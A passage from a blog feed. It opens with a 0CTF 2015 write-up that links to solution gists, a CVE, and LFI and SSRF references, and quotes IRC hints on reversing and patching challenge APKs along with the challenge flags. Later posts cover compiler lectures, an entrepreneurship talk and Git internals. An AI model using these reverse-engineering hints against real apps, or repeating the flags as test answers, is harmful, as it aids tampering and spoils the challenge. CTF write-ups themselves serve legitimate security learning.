&lt;li&gt;&lt;a href="/files/0ctf-2015-note/GREBeginner.cpp"&gt;GREBeginner&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;crypto / RSA Quine&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/mheistermann/0dee124d7eed2ec26fcd"&gt;https://gist.github.com/mheistermann/0dee124d7eed2ec26fcd&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;mobile / dataraidar&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.forensicswiki.org/wiki/How_To_Decrypt_Android_Full_Disk_Encryption"&gt;http://www.forensicswiki.org/wiki/How_To_Decrypt_Android_Full_Disk_Encryption&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.scrt.ch/2015/03/27/insomnihack-finals-insomnidroid-level-1-writeup/"&gt;http://blog.scrt.ch/2015/03/27/insomnihack-finals-insomnidroid-level-1-writeup/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;mobile / simpleapk&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://androidcracking.blogspot.tw/2010/12/getting-apk-signature-outside-of.html"&gt;http://androidcracking.blogspot.tw/2010/12/getting-apk-signature-outside-of.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;KT_SaH&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;wytshadow&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;simpleapk&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;reversed&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;lib&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;saw&lt;/span&gt; &lt;span class="n"&gt;some&lt;/span&gt; &lt;span class="n"&gt;xoring&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;so&lt;/span&gt; &lt;span class="n"&gt;I&lt;/span&gt; &lt;span class="n"&gt;xored&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;txt&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;win&lt;/span&gt;  
&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;riatre&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;wytshadow&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;simpleapk&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;reverse&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;elf&lt;/span&gt;  
&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;niklasb&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;yeah&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;maybe&lt;/span&gt; &lt;span class="n"&gt;realize&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="n"&gt;they&lt;/span&gt; &lt;span class="n"&gt;used&lt;/span&gt; &lt;span class="n"&gt;adi&lt;/span&gt;  
&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;niklasb&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;adbi&lt;/span&gt;  
&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;Zzzzzzzzzz&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;wytshadow&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;simpleapk&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;inject&lt;/span&gt; &lt;span class="n"&gt;logger&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;smali&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;recompile&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dump&lt;/span&gt; &lt;span class="n"&gt;variable&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt; &lt;span class="o"&gt;;]&lt;/span&gt;  
&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;niklasb&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;XOR&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="n"&gt;had&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;first&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;last&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt;  
&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;KT_SaH&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;ctf&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="n"&gt;Too_Simple_Sometimes_Naive&lt;/span&gt;&lt;span class="o"&gt;!!!}&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;ctf&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="n"&gt;It&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s_More_Than_Meets_The_Eye&lt;/span&gt;&lt;span class="o"&gt;!}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;mobile / VEZEL&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;niklasb&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;wytshadow&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;tl&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="n"&gt;dr&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;vezel&lt;/span&gt; &lt;span class="n"&gt;you&lt;/span&gt; &lt;span class="n"&gt;could&lt;/span&gt; &lt;span class="n"&gt;just&lt;/span&gt; &lt;span class="n"&gt;compute&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;values&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;another&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;  
&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;KT_SaH&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vezel&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;IDA&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;adb&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;  
&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;KT_SaH&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;bluestacks&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h1&gt;Pwn Challenges&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://rzhou.org/~ricky/0ctf2015/"&gt;https://rzhou.org/~ricky/0ctf2015/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="/files/0ctf-2015-note/0ops_app.py"&gt;0ops App&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/files/0ctf-2015-note/flaggenerator.py"&gt;Flag Generator&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/files/0ctf-2015-note/freenote.py"&gt;freenote&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/files/0ctf-2015-note/login.py"&gt;login&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/49c7d68ee13f29ddb435"&gt;https://gist.github.com/seanwupi/49c7d68ee13f29ddb435&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/37ffc34032c0ada9a9d8"&gt;flagen&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/929df6655f2acdbab3ff"&gt;freenode&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/e4b1f039e9f949a7b972"&gt;login&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/713023672c42aa62ca9e"&gt;0opsapp&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/286c823afe64617c652d"&gt;vbs&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VBS  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6332"&gt;CVE-2014-6332&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Misc&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;LFI - Local File Inclusion  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability"&gt;https://en.wikipedia.org/wiki/File_inclusion_vulnerability&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion"&gt;https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://hakipedia.com/index.php/Local_File_Inclusion"&gt;http://hakipedia.com/index.php/Local_File_Inclusion&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SSRF - Server Side Request Forgery  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/"&gt;https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities"&gt;http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="CTF"></category><category term="Write-up"></category><category term="0CTF"></category></entry><entry><title>Compiler Design Week 5</title><link href="https://blog.m157q.tw/posts/2015/03/24/compiler-design-week-5/" rel="alternate"></link><published>2015-03-24T16:29:38+08:00</published><updated>2015-03-24T16:29:38+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-24:posts/2015/03/24/compiler-design-week-5/</id><summary type="html">&lt;h1&gt;2015/03/24&lt;/h1&gt;
&lt;h2&gt;NFA (with ε closure) 轉 DFA&lt;/h2&gt;
&lt;h2&gt;Minimizing the number of states of a DFA&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;預設至少兩個 state (至少一個 Final State 和 至少一個 non Final State)&lt;ul&gt;
&lt;li&gt;除非證明行為真的不同，只好分更多個 state 出來。&lt;/li&gt;
&lt;li&gt;Final state 和 non Final state 一定是不同的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Equivalence Classes&lt;/h2&gt;
&lt;h2&gt;Relations and Partitions&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Partition&lt;ul&gt;
&lt;li&gt;A partition of a set is a collection of mutually disjoint subsets whose union is the original set.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If A is a set with a partition and R is the relation induced by the partition, then R is an equivalence relation.&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Course"></category><category term="Compiler"></category></entry><entry><title>Technology Entrepreneurship Week 5</title><link href="https://blog.m157q.tw/posts/2015/03/24/technology-entrepreneurship-week-5/" rel="alternate"></link><published>2015-03-24T16:27:20+08:00</published><updated>2015-03-24T16:27:20+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-24:posts/2015/03/24/technology-entrepreneurship-week-5/</id><summary type="html">&lt;h2&gt;2015/03/24&lt;/h2&gt;
&lt;h1&gt;Information about the speech&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Title: Volunteer Entrepreneur to Global Entrepreneur&lt;/li&gt;
&lt;li&gt;Speaker: Hank CY Huang / 黃經堯, National Chiao Tung University&lt;ul&gt;
&lt;li&gt;Professor, Department of Electronics Engineering in NCTU&lt;/li&gt;
&lt;li&gt;Director, NCTU Venture Lab&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.kickstarter.com/projects/myqblinks/qmote-the-water-resistant-internet-remote-for-smar"&gt;Qmote: The Water-Resistant Internet Remote for Smartphones by Qblinks — Kickstarter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.kickstarter.com/projects/1411851239/gomore-stamina-sensor-the-athletes-fuel-gauge-moni-0"&gt;GoMore Stamina Sensor - The Athlete’s Wearable Fuel Gauge by GoMore — Kickstarter&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.gomore.me/"&gt;Gomore&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Born to be Entrepreneur?&lt;ul&gt;
&lt;li&gt;Actually... You are not sure until you try!!&lt;/li&gt;
&lt;li&gt;It is the Attitude / Characteristics&lt;ul&gt;
&lt;li&gt;If not following someone's steps&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Passion&lt;ul&gt;
&lt;li&gt;No more regular schedule&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Open-minded&lt;ul&gt;
&lt;li&gt;Listen to advices&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ownership / Responsibility&lt;ul&gt;
&lt;li&gt;Remember, you are the founder&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Be brave to solve a bigger program&lt;ul&gt;
&lt;li&gt;Solving a problem that really matters&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To be Successful, you also need&lt;ul&gt;
&lt;li&gt;A team with good intention&lt;/li&gt;
&lt;li&gt;Innovation Eco-system&lt;ul&gt;
&lt;li&gt;With Professional treatment&lt;/li&gt;
&lt;li&gt;Good mentors&lt;ul&gt;
&lt;li&gt;Can be your potential business partners&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Good Investors (angels + series investment)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;For Investment (no mercy) - Business is business&lt;ul&gt;
&lt;li&gt;You need to be clear of your value proposition (tough one)&lt;/li&gt;
&lt;li&gt;Learn to find (or share with) your business partners&lt;ul&gt;
&lt;li&gt;Technology, in most cases, takes only &amp;lt; 20% credit for the success&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why we will invest you? Are you aware of &amp;gt; 90% failure rate in startups?&lt;ul&gt;
&lt;li&gt;Higher failure rates if just student-only teams&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NCTU&lt;ul&gt;
&lt;li&gt;Venture Lab&lt;/li&gt;
&lt;li&gt;Co-working space&lt;/li&gt;
&lt;li&gt;Accelerator&lt;/li&gt;
&lt;li&gt;Incubator&lt;/li&gt;
&lt;li&gt;Asia Pacific Accelerator&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Suggestions for Entrepreneur&lt;ul&gt;
&lt;li&gt;Identify a Suitable Innovation Environment to attend&lt;/li&gt;
&lt;li&gt;Participate as Volunteer Entrepreneur if no business idea&lt;ul&gt;
&lt;li&gt;Learn from startups and be parts of innovation eco-system&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Learn to be Entrepreneur if a team can be identified and enjoy the process&lt;/li&gt;
&lt;li&gt;Act as Global Entrepreneur by exploring global business opportunities and network.&lt;/li&gt;
&lt;li&gt;"If u wanna give advices, be successful first, or your opinion is useless because it's not working anywhere."&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Thoughts&lt;/h1&gt;
&lt;p&gt;At first, I thought he was going to talk about those two projects on Kickstarter because he said these two projects both are his students' projects. But, he just mentioned about them without any detials further then started to talk about those Contents and Suggestions for Entrepreneur above which I think all of those things he talked about actually can be found in most of books related to the entrepreneurship in the bookstores. Although I don't think I've learned something new, I can accept that because you know... this kind of speech always need to have such contents.  &lt;/p&gt;
&lt;p&gt;But, he showed about 5 associations in the NCTU which are helping students about their startup company or entrepreneurship in his slides, I thought he was going to talk about the details how these associations in campus will help students to make their startup dreams come ture or some kind of promote students to join these associations or make some introductions about these associations for letting students know more about them. But I was wrong, just more rules and suggestions from books.  &lt;/p&gt;
&lt;p&gt;At last in this speech, the speaker said something like “If u wanna give advices, u need to be successful first, or your opinion is useless because it's not working anywhere.”  &lt;/p&gt;
&lt;p&gt;It just made me kind of angry and don't want to ask any questions because I am “not qualified to give some advices” in his opinion anyway. If I am already a successful entrepreneur, why did I take a course called “Technology Entrepreneurship” which is supposed to teach you about how to become an entrepreneur? It's really ridiculous for me to heard about this.  &lt;/p&gt;
&lt;p&gt;I was going to ask him about:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;“Why you just kept talking about those things in the books? I wanna learn more about what would student entrepreneurs encounter in their startup business and how you help those students with their startup based on your experience, because I think those real experience is more valuable for us not those things in books you just kept talking in this speech.”  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;“Why you kept talking about that we NCTU students is better than NTU students and know more about how to cooperate with other people without giving any improvement? As myself experience, I have some NTU friends who really know how to cooperate with their teammates. Also, I think NTU is a better place for students to build a startup because there are more and diversified departments in NTU while most of departments in NCTU are all science-related.”&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Entrepreneurship"></category><category term="speech"></category></entry><entry><title>GitHub Talk - Advanced Git and CI in NCTU</title><link href="https://blog.m157q.tw/posts/2015/03/20/github-talk-advanced-git-and-ci-in-nctu/" rel="alternate"></link><published>2015-10-27T12:31:00+08:00</published><updated>2015-10-27T12:31:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-20:posts/2015/03/20/github-talk-advanced-git-and-ci-in-nctu/</id><summary type="html">&lt;h2&gt;Look into .git directory&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git init foo  
$ &lt;span class="nb"&gt;cd&lt;/span&gt; foo  
$ tree  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;.  
├── HEAD  
├── config  
├── description  
├── hooks  
│   ├── applypatch-msg.sample  
│   ├── commit-msg.sample  
│   ├── post-update.sample  
│   ├── pre-applypatch.sample  
│   ├── pre-commit.sample  
│   ├── pre-push.sample  
│   ├── pre-rebase.sample  
│   ├── prepare-commit-msg.sample  
│   └── update.sample  
├── info  
│   └── exclude  
├── objects  
│   ├── info  
│   └── pack  
└── refs  
    ├── heads  
    └── tags  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;refs  &lt;ul&gt;
&lt;li&gt;HEAD, tag, branch  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;objects  &lt;ul&gt;
&lt;li&gt;blob, tree, commit  &lt;ul&gt;
&lt;li&gt;blob  &lt;ul&gt;
&lt;li&gt;type, bytes, content of blob  &lt;/li&gt;
&lt;li&gt;ex: &lt;code&gt;blob 13hello,world&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;tree  &lt;ul&gt;
&lt;li&gt;main file directory for the project  &lt;/li&gt;
&lt;li&gt;tree: point to the next tree object  &lt;/li&gt;
&lt;li&gt;blob: ref name for blob object (one for every related object files for this tree)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;commit  &lt;ul&gt;
&lt;li&gt;parent: point to the last commit  &lt;/li&gt;
&lt;li&gt;message: commit message  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;store files for git  &lt;/li&gt;
&lt;li&gt;SHA1 hash  &lt;/li&gt;
&lt;li&gt;Compressed  &lt;/li&gt;
&lt;li&gt;commit action will add a commit object and tree object into the objects  &lt;/li&gt;
&lt;li&gt;tree objects have filenames for blob objects  &lt;/li&gt;
&lt;li&gt;blob files which have exactly same content will be stored as the same hash not only in the same project but also among all users.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Branch&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;branch just store the hash of the newest commit for that branch  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Tag&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;regular tags do not have hash value  &lt;/li&gt;
&lt;li&gt;be stored in refs/tags  &lt;/li&gt;
&lt;li&gt;just a text file contain the commit object hash  &lt;/li&gt;
&lt;li&gt;annotated tag  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;git tag -a $tag_name&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;tagger, annotation  &lt;/li&gt;
&lt;li&gt;has a hash value  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Webhook&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;use &lt;a href="http://requestb.in/"&gt;http://requestb.in/&lt;/a&gt; as payload url in github, so every time there's a event github will send event message to the payload url.  &lt;/li&gt;
&lt;li&gt;Travis CI  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/muan/emoji"&gt;https://github.com/muan/emoji&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Misc&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;if you delete tree objects manually, &lt;code&gt;git fsck&lt;/code&gt; will tell you what happened.  &lt;/li&gt;
&lt;li&gt;Git does not support empty directory  &lt;/li&gt;
&lt;li&gt;.gitkeep  &lt;/li&gt;
&lt;li&gt;Every files in Git are treated as binary, so the blob file is not just a plaintext file  &lt;/li&gt;
&lt;li&gt;git clone won't clone unreferenced files in default, but you can specify that.  &lt;/li&gt;
&lt;li&gt;git push/pull won't do anything about unreferenced files  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ watch -n .1 tree  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Git commands&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git ls-tree  
git ls-tree HEAD  

git fsck  

git show &lt;span class="nv"&gt;$tag_name&lt;/span&gt; --pretty&lt;span class="o"&gt;=&lt;/span&gt;raw&lt;span class="sb"&gt;`&lt;/span&gt;  

git rebase &lt;span class="nv"&gt;$branch&lt;/span&gt;  

git reflog  
// use reflog to get the &lt;span class="nb"&gt;hash&lt;/span&gt; or &lt;span class="nb"&gt;alias&lt;/span&gt; and use git reset to undo your actions  

git gc  
// delete useless files &lt;span class="o"&gt;(&lt;/span&gt;unreferenced files&lt;span class="o"&gt;)&lt;/span&gt; after &lt;span class="m"&gt;90&lt;/span&gt; days when someone &lt;span class="k"&gt;do&lt;/span&gt; the action  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/muan/emoji/pull/132"&gt;Example at NCTU by johndbritton · Pull Request #132 · muan/emoji · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Thoughts&lt;/h2&gt;
&lt;p&gt;雖然內容大部份在 GitBook 都有&lt;br /&gt;
不過真的覺得 &lt;a href="https://github.com/johndbritton"&gt;Mr.Britton&lt;/a&gt; 真的講解得蠻清楚的&lt;br /&gt;
比較理解 .git folder 裡面的東西是在做什麼用的&lt;br /&gt;
CI 的部分只有提到 Travis CI 在 GitHub 上面的 Webhook&lt;br /&gt;
然後 show 一下 GitHub Repo 綁 Traivs CI 後&lt;br /&gt;
在 PR 的時候會幫忙跑測試&lt;br /&gt;
原本以為會介紹一下 Travis CI 大概要怎麼用&lt;br /&gt;
看來得自己找時間研究一下了  &lt;/p&gt;
&lt;p&gt;然後今天又拿到 Octocat 的新貼紙啦&lt;br /&gt;
&lt;img alt="Octocat" src="/files/github-talk-advanced-git-and-ci-in-nctu/octocat.jpg" /&gt;&lt;br /&gt;
感謝 &lt;a href="https://github.com/muan"&gt;muan&lt;/a&gt; 的這則 Twitter &lt;a href="https://twitter.com/muanchiou/status/571684266490265601"&gt;訊息&lt;/a&gt; 才有機會在交大聽到這場 Talk&lt;br /&gt;
原來 &lt;a href="https://github.com/muan/emoji"&gt;https://github.com/muan/emoji&lt;/a&gt; 是她的 Repo&lt;br /&gt;
